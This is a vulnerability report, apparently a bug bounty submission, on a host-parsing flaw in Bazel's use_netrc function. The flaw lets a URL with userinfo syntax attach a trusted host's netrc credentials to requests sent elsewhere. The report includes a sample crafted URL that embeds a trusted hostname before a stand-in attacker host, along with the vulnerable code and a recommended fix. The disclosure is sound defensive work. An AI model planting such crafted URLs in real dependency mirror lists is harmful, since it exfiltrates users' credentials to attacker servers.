## Title
Netrc credential leak to attacker-controlled host via userinfo (`@`) host confusion in `use_netrc` — (File: `tools/build_defs/repo/utils.bzl`)

## Summary
`use_netrc()` in `tools/build_defs/repo/utils.bzl`, used by `get_auth()` (and thus by `http_archive`, `http_file`, `http_jar`, and any custom repository rule that calls `get_auth`/`use_netrc`), extracts the "host" component of a URL with naive string splitting rather than proper URL/authority parsing. This is the same bug class as the reported Pocket ID CVE (CWE-601): a URL containing userinfo (`user:pass@host`) syntax lets an attacker-chosen string appear before the real host, and the naive parser picks the wrong (attacker-controlled) piece as the "host" that gets matched against trusted netrc/`auth_patterns` entries — except here the effect is inverted from a redirect bypass into a **credential-scoping bypass**: a legitimate corporate/mirror hostname can be smuggled into the *userinfo* part of a URL whose real host is attacker-controlled, causing Bazel to attach that host's saved netrc credentials (Basic Auth / bearer token) to a request that is actually sent to the attacker's server.

## Finding Description
`use_netrc` computes the host to match against the netrc/`auth_patterns` dictionaries like this: [1](#0-0) 

```
for url in urls:
    schemerest = url.split("://", 1)
    ...
    host = schemerest[1].split("/")[0].split(":")[0]
    if host in netrc:
        authforhost = netrc[host]
```

For a standards-compliant URL authority `[userinfo@]host[:port]`, the correct host is whatever follows `@` (if present). This code instead takes everything up to the first `/` (the whole authority, including any userinfo) and then takes everything up to the first `:`. Given a URL such as:

```
https://trusted.example.org:anything@evil.attacker.com/payload.tar.gz
```

the authority is `trusted.example.org:anything@evil.attacker.com`, and `split(":")[0]` yields `trusted.example.org` — matching a legitimate netrc `machine trusted.example.org` entry — even though the URL's real host (per RFC 3986 / any conformant URL parser, and per whatever HTTP client Bazel's downloader actually uses to open the connection) is `evil.attacker.com`. The credentials (`login`/`password`, or an `auth_patterns` Bearer token bound to `trusted.example.org`) are then placed into the `auth` dict keyed by that exact URL string and passed to `repository_ctx.download`/`download_and_extract`, which will send them as the `Authorization` header for a connection that is actually made to `evil.attacker.com`.

This breaks the invariant that "credentials are host-scoped": the credential-selection logic and the actual connection-target resolution disagree about what "host" a URL points to whenever userinfo syntax is present.

## Impact Explanation
Any Bazel project or organization that:
- configures a `.netrc` file (via `NETRC` env var, `$HOME/.netrc`, or the `netrc` attribute) with credentials scoped to a trusted host (e.g., an internal artifact mirror or SCM host), and
- fetches from a URL list that includes an attacker-influenced entry (e.g., a third-party Bzlmod registry module's declared source `urls`, a `http_archive`/`http_file` mirror list contributed via an untrusted MODULE.bazel/WORKSPACE fragment, or any repository rule built on `get_auth`)

is at risk of exfiltrating the login/password or bearer token bound to the trusted host to an attacker-controlled server, since the attacker only needs to supply one URL string in the mirror list that embeds the trusted hostname as userinfo before an attacker-controlled real host. This is a credential exfiltration to an attacker-controlled host, matching the "Credentials" bug class in scope.

## Likelihood Explanation
Exploitation requires only that a URL used by `get_auth`/`use_netrc` be attacker-influenced (a common scenario for third-party dependency URLs, since `http_archive`/`http_file` frequently take multiple mirror URLs, some potentially attacker-supplied when consuming untrusted external modules or `maybe(http_archive, urls=[...])` macros from a third party) and that the victim happens to have netrc credentials configured for the hostname the attacker chooses to spoof. No MITM, no local access, and no privileged position are needed — the attacker only needs to get one crafted URL into the mirror list that Bazel evaluates.

## Recommendation
Replace the ad hoc string splitting in `use_netrc` with structured URL parsing that correctly separates userinfo from host (e.g., locate the last `@` before the first `/` to strip userinfo, then take the portion before the port `:`), and add regression tests asserting that a URL with userinfo matching a trusted netrc machine name does not receive that machine's credentials unless it is truly the host component.

def use_netrc(netrc, urls, patterns):
    """Compute an auth dict from a parsed netrc file and a list of URLs.

    Args:
      netrc: a netrc file already parsed to a dict, e.g., as obtained from
        read_netrc
      urls: a list of URLs.
      patterns: optional dict of url to authorization patterns

    Returns:
      dict suitable as auth argument for ctx.download; more precisely, the dict
      will map all URLs where the netrc file provides login and password to a
      dict containing the corresponding login, password and optional authorization pattern,
      as well as the mapping of "type" to "basic" or "pattern".
    """
    auth = {}
    for url in urls:
        schemerest = url.split("://", 1)
        if len(schemerest) < 2:
            continue
        if not (schemerest[0] in ["http", "https"]):
            # For other protocols, bazel currently does not support
            # authentication. So ignore them.
            continue
        host = schemerest[1].split("/")[0].split(":")[0]
        if host in netrc:
            authforhost = netrc[host]
        elif "" in netrc:
            authforhost = netrc[""]
        else:
            continue
```

def get_auth(ctx, urls):
    """Utility function to obtain the correct auth dict for a list of urls from .netrc file.

    Support optional netrc and auth_patterns attributes if available.

    Args:
      ctx: The repository context of the repository rule calling this utility
        function.
      urls: the list of urls to read

    Returns:
      the auth dict which can be passed to repository_ctx.download
    """
    if hasattr(ctx.attr, "netrc") and ctx.attr.netrc:
        netrc = read_netrc(ctx, ctx.attr.netrc)
    elif "NETRC" in ctx.os.environ:
        netrc = read_netrc(ctx, ctx.os.environ["NETRC"])
    else:
        netrc = read_user_netrc(ctx)
    auth_patterns = {}
    if hasattr(ctx.attr, "auth_patterns") and ctx.attr.auth_patterns:
        auth_patterns = ctx.attr.auth_patterns
    return use_netrc(netrc, urls, auth_patterns)
